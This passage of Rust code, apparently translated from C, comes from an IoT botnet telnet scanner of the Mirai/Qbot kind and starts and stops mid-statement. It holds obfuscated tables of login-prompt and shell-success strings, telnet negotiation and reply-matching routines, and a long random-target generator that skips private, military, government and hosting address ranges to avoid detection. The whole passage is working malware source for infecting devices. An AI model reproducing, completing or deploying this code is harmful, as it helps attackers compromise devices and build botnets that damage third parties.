    b"\xFF\xCE\xB9\xE7\xE7Q\xCE9\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"Q\xFF\x19Qa\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"Q\xE7\xE7\xB9\xE7\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xB9\xB9a\xD2\"Q\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xD2\x90a\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"9\x19\xD4Q\xB9\xE49\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
];
#[no_mangle]
pub static mut successes: [*mut libc::c_char; 7] = [
    b"\xA5\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF3\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xDB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"~\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x03eQ<<\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"a\xFC\xE7a\xFC\x03\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE4\x03\"\xD2\xB9\xC1\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
];
#[no_mangle]
pub static mut advances2: [*mut libc::c_char; 10] = [
    b"\xFF\xFC\x90<\x19a\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90\x19<Qa\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xFF\xCE\xB9\xE7\xE7Q\xCE9\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"Q\xFF\x19Qa\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xE7\xB9\xE7\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xB9\xB9a\xD2\"Q\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xD2\x90a\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xD2\xE4\x03\"\xD2\xB9\xC1\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xA5\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF3\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
];
#[no_mangle]
pub static mut leig: *mut libc::c_char = b"\xD2\x19\xFF\0" as *const u8
    as *const libc::c_char as *mut libc::c_char;
#[no_mangle]
pub unsafe extern "C" fn makeRandomStr(
    mut buf: *mut libc::c_uchar,
    mut length: libc::c_int,
) {
    let mut i_0: libc::c_int = 0 as libc::c_int;
    i_0 = 0 as libc::c_int;
    while i_0 < length {
        *buf
            .offset(
                i_0 as isize,
            ) = (rand_cmwc())
            .wrapping_rem((91 as libc::c_int - 65 as libc::c_int) as libc::c_uint)
            .wrapping_add(65 as libc::c_int as libc::c_uint) as libc::c_uchar;
        i_0 += 1;
    }
}
#[no_mangle]
pub unsafe extern "C" fn get_telstate_host(
    mut telstate: *mut telstate_t,
) -> *const libc::c_char {
    let mut in_addr_ip: in_addr = in_addr { s_addr: 0 };
    in_addr_ip.s_addr = (*telstate).ip;
    return inet_ntoa(in_addr_ip);
}
#[no_mangle]
pub unsafe extern "C" fn advance_telstate(
    mut telstate: *mut telstate_t,
    mut new_state: libc::c_int,
) {
    if new_state == 0 as libc::c_int {
        close((*telstate).fd);
    }
    (*telstate).totalTimeout = 0 as libc::c_int as libc::c_uint;
    (*telstate).state = new_state as libc::c_uchar;
    memset(
        (*telstate).sockbuf as *mut libc::c_void,
        0 as libc::c_int,
        1024 as libc::c_int as libc::c_ulong,
    );
}
#[no_mangle]
pub unsafe extern "C" fn negotiate(
    mut sock: libc::c_int,
    mut buf: *mut libc::c_uchar,
    mut len: libc::c_int,
) -> libc::c_int {
    let mut c_0: libc::c_uchar = 0;
    match *buf.offset(1 as libc::c_int as isize) as libc::c_int {
        255 => return 0 as libc::c_int,
        251 | 252 | 253 | 254 => {
            c_0 = 255 as libc::c_int as libc::c_uchar;
            send(
                sock,
                &mut c_0 as *mut libc::c_uchar as *const libc::c_void,
                1 as libc::c_int as size_t,
                MSG_NOSIGNAL as libc::c_int,
            );
            if 252 as libc::c_int
                == *buf.offset(1 as libc::c_int as isize) as libc::c_int
            {
                c_0 = 254 as libc::c_int as libc::c_uchar;
            } else if 254 as libc::c_int
                == *buf.offset(1 as libc::c_int as isize) as libc::c_int
            {
                c_0 = 252 as libc::c_int as libc::c_uchar;
            } else if 3 as libc::c_int
                == *buf.offset(1 as libc::c_int as isize) as libc::c_int
            {
                c_0 = (if *buf.offset(1 as libc::c_int as isize) as libc::c_int
                    == 253 as libc::c_int
                {
                    251 as libc::c_int
                } else {
                    253 as libc::c_int
                }) as libc::c_uchar;
            } else {
                c_0 = (if *buf.offset(1 as libc::c_int as isize) as libc::c_int
                    == 253 as libc::c_int
                {
                    252 as libc::c_int
                } else {
                    254 as libc::c_int
                }) as libc::c_uchar;
            }
            send(
                sock,
                &mut c_0 as *mut libc::c_uchar as *const libc::c_void,
                1 as libc::c_int as size_t,
                MSG_NOSIGNAL as libc::c_int,
            );
            send(
                sock,
                &mut *buf.offset(2 as libc::c_int as isize) as *mut libc::c_uchar
                    as *const libc::c_void,
                1 as libc::c_int as size_t,
                MSG_NOSIGNAL as libc::c_int,
            );
        }
        _ => {}
    }
    return 0 as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn szk_wcsstri(
    mut s1: *const libc::c_char,
    mut s2: *const libc::c_char,
) -> *const libc::c_char {
    if s1.is_null() || s2.is_null() {
        return 0 as *const libc::c_char;
    }
    let mut cpws1: *const libc::c_char = s1;
    let mut cpws1_: *const libc::c_char = 0 as *const libc::c_char;
    let mut cpws2: *const libc::c_char = 0 as *const libc::c_char;
    let mut ch1: libc::c_char = 0;
    let mut ch2: libc::c_char = 0;
    let mut bSame: libc::c_int = 0;
    while *cpws1 as libc::c_int != '\0' as i32 {
        bSame = 1 as libc::c_int;
        if *cpws1 as libc::c_int != *s2 as libc::c_int {
            ch1 = mytoupper(*cpws1 as libc::c_int) as libc::c_char;
            ch2 = mytoupper(*s2 as libc::c_int) as libc::c_char;
            if ch1 as libc::c_int == ch2 as libc::c_int {
                bSame = 1 as libc::c_int;
            }
        }
        if 1 as libc::c_int == bSame {
            cpws1_ = cpws1;
            cpws2 = s2;
            while *cpws1_ as libc::c_int != '\0' as i32 {
                ch1 = mytoupper(*cpws1_ as libc::c_int) as libc::c_char;
                ch2 = mytoupper(*cpws2 as libc::c_int) as libc::c_char;
                if ch1 as libc::c_int != ch2 as libc::c_int {
                    break;
                }
                cpws2 = cpws2.offset(1);
                if *cpws2 as libc::c_int == '\0' as i32 {
                    return cpws1_
                        .offset(
                            -((cpws2.offset_from(s2) as libc::c_long
                                - 0x1 as libc::c_int as libc::c_long) as isize),
                        );
                }
                cpws1_ = cpws1_.offset(1);
            }
        }
        cpws1 = cpws1.offset(1);
    }
    return 0 as *const libc::c_char;
}
#[no_mangle]
pub unsafe extern "C" fn contains_string(
    mut buffer: *mut libc::c_char,
    mut strings: *mut *mut libc::c_char,
) -> libc::c_int {
    let mut num_strings: libc::c_int = 0 as libc::c_int;
    let mut i_0: libc::c_int = 0 as libc::c_int;
    num_strings = 0 as libc::c_int;
    loop {
        num_strings += 1;
        if (*strings.offset(num_strings as isize)).is_null() {
            break;
        }
    }
    i_0 = 0 as libc::c_int;
    while i_0 < num_strings {
        if !(szk_wcsstri(buffer, eika(*strings.offset(i_0 as isize)))).is_null() {
            return 1 as libc::c_int;
        }
        i_0 += 1;
    }
    return 0 as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn getPIP() -> uint32_t {
    let mut tmp: uint32_t = 0;
    let mut o1: uint8_t = 0;
    let mut o2: uint8_t = 0;
    let mut o3: uint8_t = 0;
    let mut o4: uint8_t = 0;
    loop {
        tmp = rand() as uint32_t;
        o1 = (tmp & 0xff as libc::c_int as libc::c_uint) as uint8_t;
        o2 = (tmp >> 8 as libc::c_int & 0xff as libc::c_int as libc::c_uint) as uint8_t;
        o3 = (tmp >> 16 as libc::c_int & 0xff as libc::c_int as libc::c_uint) as uint8_t;
        o4 = (tmp >> 24 as libc::c_int & 0xff as libc::c_int as libc::c_uint) as uint8_t;
        if !(o1 as libc::c_int == 127 as libc::c_int
            || o1 as libc::c_int == 0 as libc::c_int
            || o1 as libc::c_int == 3 as libc::c_int
            || o1 as libc::c_int == 15 as libc::c_int
            || o1 as libc::c_int == 56 as libc::c_int
            || o1 as libc::c_int == 10 as libc::c_int
            || o1 as libc::c_int == 25 as libc::c_int
            || o1 as libc::c_int == 49 as libc::c_int
            || o1 as libc::c_int == 50 as libc::c_int
            || o1 as libc::c_int == 137 as libc::c_int
            || o1 as libc::c_int == 6 as libc::c_int
            || o1 as libc::c_int == 7 as libc::c_int
            || o1 as libc::c_int == 11 as libc::c_int
            || o1 as libc::c_int == 21 as libc::c_int
            || o1 as libc::c_int == 22 as libc::c_int
            || o1 as libc::c_int == 26 as libc::c_int
            || o1 as libc::c_int == 28 as libc::c_int
            || o1 as libc::c_int == 29 as libc::c_int
            || o1 as libc::c_int == 30 as libc::c_int
            || o1 as libc::c_int == 33 as libc::c_int
            || o1 as libc::c_int == 55 as libc::c_int
            || o1 as libc::c_int == 214 as libc::c_int
            || o1 as libc::c_int == 215 as libc::c_int
            || o1 as libc::c_int == 192 as libc::c_int
                && o2 as libc::c_int == 168 as libc::c_int
            || o1 as libc::c_int == 146 as libc::c_int
                && o2 as libc::c_int == 17 as libc::c_int
            || o1 as libc::c_int == 146 as libc::c_int
                && o2 as libc::c_int == 80 as libc::c_int
            || o1 as libc::c_int == 146 as libc::c_int
                && o2 as libc::c_int == 98 as libc::c_int
            || o1 as libc::c_int == 146 as libc::c_int
                && o2 as libc::c_int == 154 as libc::c_int
            || o1 as libc::c_int == 147 as libc::c_int
                && o2 as libc::c_int == 159 as libc::c_int
            || o1 as libc::c_int == 148 as libc::c_int
                && o2 as libc::c_int == 114 as libc::c_int
            || o1 as libc::c_int == 150 as libc::c_int
                && o2 as libc::c_int == 125 as libc::c_int
            || o1 as libc::c_int == 150 as libc::c_int
                && o2 as libc::c_int == 133 as libc::c_int
            || o1 as libc::c_int == 150 as libc::c_int
                && o2 as libc::c_int == 144 as libc::c_int
            || o1 as libc::c_int == 150 as libc::c_int
                && o2 as libc::c_int == 149 as libc::c_int
            || o1 as libc::c_int == 150 as libc::c_int
                && o2 as libc::c_int == 157 as libc::c_int
            || o1 as libc::c_int == 150 as libc::c_int
                && o2 as libc::c_int == 184 as libc::c_int
            || o1 as libc::c_int == 150 as libc::c_int
                && o2 as libc::c_int == 190 as libc::c_int
            || o1 as libc::c_int == 150 as libc::c_int
                && o2 as libc::c_int == 196 as libc::c_int
            || o1 as libc::c_int == 152 as libc::c_int
                && o2 as libc::c_int == 82 as libc::c_int
            || o1 as libc::c_int == 152 as libc::c_int
                && o2 as libc::c_int == 229 as libc::c_int
            || o1 as libc::c_int == 157 as libc::c_int
                && o2 as libc::c_int == 202 as libc::c_int
            || o1 as libc::c_int == 157 as libc::c_int
                && o2 as libc::c_int == 217 as libc::c_int
            || o1 as libc::c_int == 161 as libc::c_int
                && o2 as libc::c_int == 124 as libc::c_int
            || o1 as libc::c_int == 162 as libc::c_int
                && o2 as libc::c_int == 32 as libc::c_int
            || o1 as libc::c_int == 155 as libc::c_int
                && o2 as libc::c_int == 96 as libc::c_int
            || o1 as libc::c_int == 155 as libc::c_int
                && o2 as libc::c_int == 149 as libc::c_int
            || o1 as libc::c_int == 155 as libc::c_int
                && o2 as libc::c_int == 155 as libc::c_int
            || o1 as libc::c_int == 155 as libc::c_int
                && o2 as libc::c_int == 178 as libc::c_int
            || o1 as libc::c_int == 164 as libc::c_int
                && o2 as libc::c_int == 158 as libc::c_int
            || o1 as libc::c_int == 156 as libc::c_int
                && o2 as libc::c_int == 9 as libc::c_int
            || o1 as libc::c_int == 167 as libc::c_int
                && o2 as libc::c_int == 44 as libc::c_int
            || o1 as libc::c_int == 168 as libc::c_int
                && o2 as libc::c_int == 68 as libc::c_int
            || o1 as libc::c_int == 168 as libc::c_int
                && o2 as libc::c_int == 85 as libc::c_int
            || o1 as libc::c_int == 168 as libc::c_int
                && o2 as libc::c_int == 102 as libc::c_int
            || o1 as libc::c_int == 203 as libc::c_int
                && o2 as libc::c_int == 59 as libc::c_int
            || o1 as libc::c_int == 204 as libc::c_int
                && o2 as libc::c_int == 34 as libc::c_int
            || o1 as libc::c_int == 207 as libc::c_int
                && o2 as libc::c_int == 30 as libc::c_int
            || o1 as libc::c_int == 117 as libc::c_int
                && o2 as libc::c_int == 55 as libc::c_int
            || o1 as libc::c_int == 117 as libc::c_int
                && o2 as libc::c_int == 56 as libc::c_int
            || o1 as libc::c_int == 80 as libc::c_int
                && o2 as libc::c_int == 235 as libc::c_int
            || o1 as libc::c_int == 207 as libc::c_int
                && o2 as libc::c_int == 120 as libc::c_int
            || o1 as libc::c_int == 209 as libc::c_int
                && o2 as libc::c_int == 35 as libc::c_int
            || o1 as libc::c_int == 64 as libc::c_int
                && o2 as libc::c_int == 70 as libc::c_int
            || o1 as libc::c_int == 172 as libc::c_int
                && o2 as libc::c_int >= 16 as libc::c_int
                && (o2 as libc::c_int) < 32 as libc::c_int
            || o1 as libc::c_int == 100 as libc::c_int
                && o2 as libc::c_int >= 64 as libc::c_int
                && (o2 as libc::c_int) < 127 as libc::c_int
            || o1 as libc::c_int == 169 as libc::c_int
                && o2 as libc::c_int == 254 as libc::c_int
            || o1 as libc::c_int == 198 as libc::c_int
                && o2 as libc::c_int >= 18 as libc::c_int
                && (o2 as libc::c_int) < 20 as libc::c_int
            || o1 as libc::c_int == 64 as libc::c_int
                && o2 as libc::c_int >= 69 as libc::c_int
                && (o2 as libc::c_int) < 227 as libc::c_int
            || o1 as libc::c_int == 128 as libc::c_int
                && o2 as libc::c_int >= 35 as libc::c_int
                && (o2 as libc::c_int) < 237 as libc::c_int
            || o1 as libc::c_int == 129 as libc::c_int
                && o2 as libc::c_int >= 22 as libc::c_int
                && (o2 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 130 as libc::c_int
                && o2 as libc::c_int >= 40 as libc::c_int
                && (o2 as libc::c_int) < 168 as libc::c_int
            || o1 as libc::c_int == 131 as libc::c_int
                && o2 as libc::c_int >= 3 as libc::c_int
                && (o2 as libc::c_int) < 251 as libc::c_int
            || o1 as libc::c_int == 132 as libc::c_int
                && o2 as libc::c_int >= 3 as libc::c_int
                && (o2 as libc::c_int) < 251 as libc::c_int
            || o1 as libc::c_int == 134 as libc::c_int
                && o2 as libc::c_int >= 5 as libc::c_int
                && (o2 as libc::c_int) < 235 as libc::c_int
            || o1 as libc::c_int == 136 as libc::c_int
                && o2 as libc::c_int >= 177 as libc::c_int
                && (o2 as libc::c_int) < 223 as libc::c_int
            || o1 as libc::c_int == 138 as libc::c_int
                && o2 as libc::c_int >= 13 as libc::c_int
                && (o2 as libc::c_int) < 194 as libc::c_int
            || o1 as libc::c_int == 139 as libc::c_int
                && o2 as libc::c_int >= 31 as libc::c_int
                && (o2 as libc::c_int) < 143 as libc::c_int
            || o1 as libc::c_int == 140 as libc::c_int
                && o2 as libc::c_int >= 1 as libc::c_int
                && (o2 as libc::c_int) < 203 as libc::c_int
            || o1 as libc::c_int == 143 as libc::c_int
                && o2 as libc::c_int >= 45 as libc::c_int
                && (o2 as libc::c_int) < 233 as libc::c_int
            || o1 as libc::c_int == 144 as libc::c_int
                && o2 as libc::c_int >= 99 as libc::c_int
                && (o2 as libc::c_int) < 253 as libc::c_int
            || o1 as libc::c_int == 146 as libc::c_int
                && o2 as libc::c_int >= 165 as libc::c_int
                && (o2 as libc::c_int) < 166 as libc::c_int
            || o1 as libc::c_int == 147 as libc::c_int
                && o2 as libc::c_int >= 35 as libc::c_int
                && (o2 as libc::c_int) < 43 as libc::c_int
            || o1 as libc::c_int == 147 as libc::c_int
                && o2 as libc::c_int >= 103 as libc::c_int
                && (o2 as libc::c_int) < 105 as libc::c_int
            || o1 as libc::c_int == 147 as libc::c_int
                && o2 as libc::c_int >= 168 as libc::c_int
                && (o2 as libc::c_int) < 170 as libc::c_int
            || o1 as libc::c_int == 147 as libc::c_int
                && o2 as libc::c_int >= 198 as libc::c_int
                && (o2 as libc::c_int) < 200 as libc::c_int
            || o1 as libc::c_int == 147 as libc::c_int
                && o2 as libc::c_int >= 238 as libc::c_int
                && (o2 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 150 as libc::c_int
                && o2 as libc::c_int >= 113 as libc::c_int
                && (o2 as libc::c_int) < 115 as libc::c_int
            || o1 as libc::c_int == 152 as libc::c_int
                && o2 as libc::c_int >= 151 as libc::c_int
                && (o2 as libc::c_int) < 155 as libc::c_int
            || o1 as libc::c_int == 153 as libc::c_int
                && o2 as libc::c_int >= 21 as libc::c_int
                && (o2 as libc::c_int) < 32 as libc::c_int
            || o1 as libc::c_int == 155 as libc::c_int
                && o2 as libc::c_int >= 5 as libc::c_int
                && (o2 as libc::c_int) < 10 as libc::c_int
            || o1 as libc::c_int == 155 as libc::c_int
                && o2 as libc::c_int >= 74 as libc::c_int
                && (o2 as libc::c_int) < 89 as libc::c_int
            || o1 as libc::c_int == 155 as libc::c_int
                && o2 as libc::c_int >= 213 as libc::c_int
                && (o2 as libc::c_int) < 222 as libc::c_int
            || o1 as libc::c_int == 157 as libc::c_int
                && o2 as libc::c_int >= 150 as libc::c_int
                && (o2 as libc::c_int) < 154 as libc::c_int
            || o1 as libc::c_int == 158 as libc::c_int
                && o2 as libc::c_int >= 1 as libc::c_int
                && (o2 as libc::c_int) < 21 as libc::c_int
            || o1 as libc::c_int == 158 as libc::c_int
                && o2 as libc::c_int >= 235 as libc::c_int
                && (o2 as libc::c_int) < 247 as libc::c_int
            || o1 as libc::c_int == 159 as libc::c_int
                && o2 as libc::c_int >= 120 as libc::c_int
                && (o2 as libc::c_int) < 121 as libc::c_int
            || o1 as libc::c_int == 160 as libc::c_int
                && o2 as libc::c_int >= 132 as libc::c_int
                && (o2 as libc::c_int) < 151 as libc::c_int
            || o1 as libc::c_int == 64 as libc::c_int
                && o2 as libc::c_int >= 224 as libc::c_int
                && (o2 as libc::c_int) < 227 as libc::c_int
            || o1 as libc::c_int == 162 as libc::c_int
                && o2 as libc::c_int >= 45 as libc::c_int
                && (o2 as libc::c_int) < 47 as libc::c_int
            || o1 as libc::c_int == 163 as libc::c_int
                && o2 as libc::c_int >= 205 as libc::c_int
                && (o2 as libc::c_int) < 207 as libc::c_int
            || o1 as libc::c_int == 164 as libc::c_int
                && o2 as libc::c_int >= 45 as libc::c_int
                && (o2 as libc::c_int) < 50 as libc::c_int
            || o1 as libc::c_int == 164 as libc::c_int
                && o2 as libc::c_int >= 217 as libc::c_int
                && (o2 as libc::c_int) < 233 as libc::c_int
            || o1 as libc::c_int == 169 as libc::c_int
                && o2 as libc::c_int >= 252 as libc::c_int
                && (o2 as libc::c_int) < 254 as libc::c_int
            || o1 as libc::c_int == 199 as libc::c_int
                && o2 as libc::c_int >= 121 as libc::c_int
                && (o2 as libc::c_int) < 254 as libc::c_int
            || o1 as libc::c_int == 205 as libc::c_int
                && o2 as libc::c_int >= 1 as libc::c_int
                && (o2 as libc::c_int) < 118 as libc::c_int
            || o1 as libc::c_int == 207 as libc::c_int
                && o2 as libc::c_int >= 60 as libc::c_int
                && (o2 as libc::c_int) < 62 as libc::c_int
            || o1 as libc::c_int == 104 as libc::c_int
                && o2 as libc::c_int >= 16 as libc::c_int
                && (o2 as libc::c_int) < 31 as libc::c_int
            || o1 as libc::c_int == 188 as libc::c_int
                && o2 as libc::c_int == 166 as libc::c_int
            || o1 as libc::c_int == 188 as libc::c_int
                && o2 as libc::c_int == 226 as libc::c_int
            || o1 as libc::c_int == 159 as libc::c_int
                && o2 as libc::c_int == 203 as libc::c_int
            || o1 as libc::c_int == 162 as libc::c_int
                && o2 as libc::c_int == 243 as libc::c_int
            || o1 as libc::c_int == 45 as libc::c_int
                && o2 as libc::c_int == 55 as libc::c_int
            || o1 as libc::c_int == 178 as libc::c_int
                && o2 as libc::c_int == 62 as libc::c_int
            || o1 as libc::c_int == 104 as libc::c_int
                && o2 as libc::c_int == 131 as libc::c_int
            || o1 as libc::c_int == 104 as libc::c_int
                && o2 as libc::c_int == 236 as libc::c_int
            || o1 as libc::c_int == 107 as libc::c_int
                && o2 as libc::c_int == 170 as libc::c_int
            || o1 as libc::c_int == 138 as libc::c_int
                && o2 as libc::c_int == 197 as libc::c_int
            || o1 as libc::c_int == 138 as libc::c_int
                && o2 as libc::c_int == 68 as libc::c_int
            || o1 as libc::c_int == 139 as libc::c_int
                && o2 as libc::c_int == 59 as libc::c_int
            || o1 as libc::c_int == 146 as libc::c_int
                && o2 as libc::c_int == 185 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 191 as libc::c_int
            || o1 as libc::c_int == 163 as libc::c_int
                && o2 as libc::c_int == 47 as libc::c_int
                && o3 as libc::c_int >= 10 as libc::c_int
                && (o3 as libc::c_int) < 11 as libc::c_int
            || o1 as libc::c_int == 174 as libc::c_int
                && o2 as libc::c_int == 138 as libc::c_int
                && o3 as libc::c_int >= 1 as libc::c_int
                && (o3 as libc::c_int) < 127 as libc::c_int
            || o1 as libc::c_int == 192 as libc::c_int
                && o2 as libc::c_int == 241 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 198 as libc::c_int
                && o2 as libc::c_int == 199 as libc::c_int
                && o3 as libc::c_int >= 64 as libc::c_int
                && (o3 as libc::c_int) < 127 as libc::c_int
            || o1 as libc::c_int == 198 as libc::c_int
                && o2 as libc::c_int == 211 as libc::c_int
                && o3 as libc::c_int >= 96 as libc::c_int
                && (o3 as libc::c_int) < 127 as libc::c_int
            || o1 as libc::c_int == 207 as libc::c_int
                && o2 as libc::c_int == 154 as libc::c_int
                && o3 as libc::c_int >= 192 as libc::c_int
                && (o3 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 37 as libc::c_int
                && o2 as libc::c_int == 139 as libc::c_int
                && o3 as libc::c_int >= 1 as libc::c_int
                && (o3 as libc::c_int) < 31 as libc::c_int
            || o1 as libc::c_int == 67 as libc::c_int
                && o2 as libc::c_int == 207 as libc::c_int
                && o3 as libc::c_int >= 64 as libc::c_int
                && (o3 as libc::c_int) < 95 as libc::c_int
            || o1 as libc::c_int == 67 as libc::c_int
                && o2 as libc::c_int == 205 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 191 as libc::c_int
            || o1 as libc::c_int == 80 as libc::c_int
                && o2 as libc::c_int == 240 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 143 as libc::c_int
            || o1 as libc::c_int == 82 as libc::c_int
                && o2 as libc::c_int == 196 as libc::c_int
                && o3 as libc::c_int >= 1 as libc::c_int
                && (o3 as libc::c_int) < 15 as libc::c_int
            || o1 as libc::c_int == 95 as libc::c_int
                && o2 as libc::c_int == 85 as libc::c_int
                && o3 as libc::c_int >= 8 as libc::c_int
                && (o3 as libc::c_int) < 63 as libc::c_int
            || o1 as libc::c_int == 64 as libc::c_int
                && o2 as libc::c_int == 237 as libc::c_int
                && o3 as libc::c_int >= 32 as libc::c_int
                && (o3 as libc::c_int) < 43 as libc::c_int
            || o1 as libc::c_int == 185 as libc::c_int
                && o2 as libc::c_int == 92 as libc::c_int
                && o3 as libc::c_int >= 220 as libc::c_int
                && (o3 as libc::c_int) < 223 as libc::c_int
            || o1 as libc::c_int == 104 as libc::c_int
                && o2 as libc::c_int == 238 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 191 as libc::c_int
            || o1 as libc::c_int == 209 as libc::c_int
                && o2 as libc::c_int == 222 as libc::c_int
                && o3 as libc::c_int >= 1 as libc::c_int
                && (o3 as libc::c_int) < 31 as libc::c_int
            || o1 as libc::c_int == 208 as libc::c_int
                && o2 as libc::c_int == 167 as libc::c_int
                && o3 as libc::c_int >= 232 as libc::c_int
                && (o3 as libc::c_int) < 252 as libc::c_int
            || o1 as libc::c_int == 66 as libc::c_int
                && o2 as libc::c_int == 55 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 159 as libc::c_int
            || o1 as libc::c_int == 45 as libc::c_int
                && o2 as libc::c_int == 63 as libc::c_int
                && o3 as libc::c_int >= 1 as libc::c_int
                && (o3 as libc::c_int) < 127 as libc::c_int
            || o1 as libc::c_int == 216 as libc::c_int
                && o2 as libc::c_int == 237 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 159 as libc::c_int
            || o1 as libc::c_int == 108 as libc::c_int
                && o2 as libc::c_int == 61 as libc::c_int
            || o1 as libc::c_int == 45 as libc::c_int
                && o2 as libc::c_int == 76 as libc::c_int
            || o1 as libc::c_int == 185 as libc::c_int
                && o2 as libc::c_int == 11 as libc::c_int
                && o3 as libc::c_int >= 144 as libc::c_int
                && (o3 as libc::c_int) < 148 as libc::c_int
            || o1 as libc::c_int == 185 as libc::c_int
                && o2 as libc::c_int == 56 as libc::c_int
                && o3 as libc::c_int >= 21 as libc::c_int
                && (o3 as libc::c_int) < 23 as libc::c_int
            || o1 as libc::c_int == 185 as libc::c_int
                && o2 as libc::c_int == 61 as libc::c_int
                && o3 as libc::c_int >= 136 as libc::c_int
                && (o3 as libc::c_int) < 139 as libc::c_int
            || o1 as libc::c_int == 185 as libc::c_int
                && o2 as libc::c_int == 62 as libc::c_int
                && o3 as libc::c_int >= 187 as libc::c_int
                && (o3 as libc::c_int) < 191 as libc::c_int
            || o1 as libc::c_int == 66 as libc::c_int
                && o2 as libc::c_int == 150 as libc::c_int
                && o3 as libc::c_int >= 120 as libc::c_int
                && (o3 as libc::c_int) < 215 as libc::c_int
            || o1 as libc::c_int == 66 as libc::c_int
                && o2 as libc::c_int == 151 as libc::c_int
                && o3 as libc::c_int >= 137 as libc::c_int
                && (o3 as libc::c_int) < 139 as libc::c_int
            || o1 as libc::c_int == 64 as libc::c_int
                && o2 as libc::c_int == 94 as libc::c_int
                && o3 as libc::c_int >= 237 as libc::c_int
                && (o3 as libc::c_int) < 255 as libc::c_int
            || o1 as libc::c_int == 63 as libc::c_int
                && o2 as libc::c_int == 251 as libc::c_int
                && o3 as libc::c_int >= 19 as libc::c_int
                && (o3 as libc::c_int) < 21 as libc::c_int
            || o1 as libc::c_int == 70 as libc::c_int
                && o2 as libc::c_int == 42 as libc::c_int
                && o3 as libc::c_int >= 73 as libc::c_int
                && (o3 as libc::c_int) < 75 as libc::c_int
            || o1 as libc::c_int == 74 as libc::c_int
                && o2 as libc::c_int == 91 as libc::c_int
                && o3 as libc::c_int >= 113 as libc::c_int
                && (o3 as libc::c_int) < 115 as libc::c_int
            || o1 as libc::c_int == 74 as libc::c_int
                && o2 as libc::c_int == 201 as libc::c_int
                && o3 as libc::c_int >= 56 as libc::c_int
                && (o3 as libc::c_int) < 58 as libc::c_int
            || o1 as libc::c_int == 188 as libc::c_int
                && o2 as libc::c_int == 209 as libc::c_int
                && o3 as libc::c_int >= 48 as libc::c_int
                && (o3 as libc::c_int) < 53 as libc::c_int
            || o1 as libc::c_int == 188 as libc::c_int
                && o2 as libc::c_int == 165 as libc::c_int
            || o1 as libc::c_int == 149 as libc::c_int
                && o2 as libc::c_int == 202 as libc::c_int
            || o1 as libc::c_int == 151 as libc::c_int
                && o2 as libc::c_int == 80 as libc::c_int
            || o1 as libc::c_int == 164 as libc::c_int
                && o2 as libc::c_int == 132 as libc::c_int
            || o1 as libc::c_int == 176 as libc::c_int
                && o2 as libc::c_int == 31 as libc::c_int
            || o1 as libc::c_int == 167 as libc::c_int
                && o2 as libc::c_int == 114 as libc::c_int
            || o1 as libc::c_int == 178 as libc::c_int
                && o2 as libc::c_int == 32 as libc::c_int
            || o1 as libc::c_int == 178 as libc::c_int
                && o2 as libc::c_int == 33 as libc::c_int
            || o1 as libc::c_int == 37 as libc::c_int
                && o2 as libc::c_int == 59 as libc::c_int
            || o1 as libc::c_int == 37 as libc::c_int
                && o2 as libc::c_int == 187 as libc::c_int
            || o1 as libc::c_int == 46 as libc::c_int
                && o2 as libc::c_int == 105 as libc::c_int
            || o1 as libc::c_int == 51 as libc::c_int
                && o2 as libc::c_int == 254 as libc::c_int
            || o1 as libc::c_int == 51 as libc::c_int
                && o2 as libc::c_int == 255 as libc::c_int
            || o1 as libc::c_int == 5 as libc::c_int
                && o2 as libc::c_int == 135 as libc::c_int
            || o1 as libc::c_int == 5 as libc::c_int
                && o2 as libc::c_int == 196 as libc::c_int
            || o1 as libc::c_int == 5 as libc::c_int
                && o2 as libc::c_int == 39 as libc::c_int
            || o1 as libc::c_int == 91 as libc::c_int
                && o2 as libc::c_int == 134 as libc::c_int
            || o1 as libc::c_int == 104 as libc::c_int
                && o2 as libc::c_int == 200 as libc::c_int
                && o3 as libc::c_int >= 128 as libc::c_int
                && (o3 as libc::c_int) < 159 as libc::c_int
            || o1 as libc::c_int == 107 as libc::c_int
                && o2 as libc::c_int == 152 as libc::c_int
                && o3 as libc::c_int >= 96 as libc::c_int
                && (o3 as libc::c_int) < 111 as libc::c_int
            || o1 as libc::c_int == 107 as libc::c_int
                && o2 as libc::c_int == 181 as libc::c_int
                && o3 as libc::c_int >= 160 as libc::c_int
                && (o3 as libc::c_int) < 189 as libc::c_int
            || o1 as libc::c_int == 172 as libc::c_int
